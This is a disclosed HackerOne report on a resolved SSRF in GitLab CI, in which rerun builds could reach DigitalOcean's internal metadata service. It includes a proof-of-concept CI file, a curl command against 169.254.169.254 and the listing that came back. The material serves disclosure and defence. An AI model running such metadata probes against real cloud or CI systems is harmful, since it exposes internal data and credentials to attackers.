---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '369451'
original_report_id: '369451'
title: SSRF in CI after first run
weakness: Server-Side Request Forgery (SSRF)
team_handle: gitlab
created_at: '2018-06-21T06:03:43.506Z'
disclosed_at: '2019-04-12T19:57:38.977Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 69
tags:
- hackerone
- server-side-request-forgery-ssrf
---

# SSRF in CI after first run

## Metadata

- HackerOne Report ID: 369451
- Weakness: Server-Side Request Forgery (SSRF)
- Program: gitlab
- Disclosed At: 2019-04-12T19:57:38.977Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

**Summary:** 
During the first run, the CI pipeline seems to defend against SSRF properly, however when a build is re-run a second time, I am able to access internal metadata endpoints for digitalocean

**Description:**
The following resources are accessible on the second run of a CI build. For instance,
`http://169.254.169.254/metadata/v1.json` 
and `http://169.254.169.254/metadata/v1/`
are both visible.


## Steps To Reproduce:

(Add details for how we can reproduce the issue)

  1. Create a `.gitlab-ci.yml`. This was my PoC:

```
# This file is a template, and might need editing before it works on your project.
# Official framework image. Look for the different tagged releases at:
# https://hub.docker.com/r/library/node/tags/
image: node:latest

# This folder is cached between builds
# http://docs.gitlab.com/ce/ci/yaml/README.html#cache
cache:
  paths:
  - node_modules/

test:
  stage: test
  script:
    - npm install
    - npm test

pack:
  stage: deploy
  script:
    - chmod +x run.sh
    - ./run.sh
    - npm install
    - npm pack
  artifacts:
    paths:
    - ./*.tgz
```
  2. Create a bash file containing this line:  
```
curl -L http://169.254.169.254/metadata/v1/
```
  3. Run the build pipeline. It will work as intended with no leaks. Now re-run the build. You should see this output:

```
id
hostname  
user-data  
vendor-data  
public-keys  
region  
interfaces/  
dns/  
floating_ip/  
tags/  
features/  
```
This indicates access to internal resources, and thus successful SSRF.

## Impact

Any internal resources visible to the node. For gitlab cloud, this looks to be digitalocean metadata, but this will also allow access to any resources the gitlab server can see.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
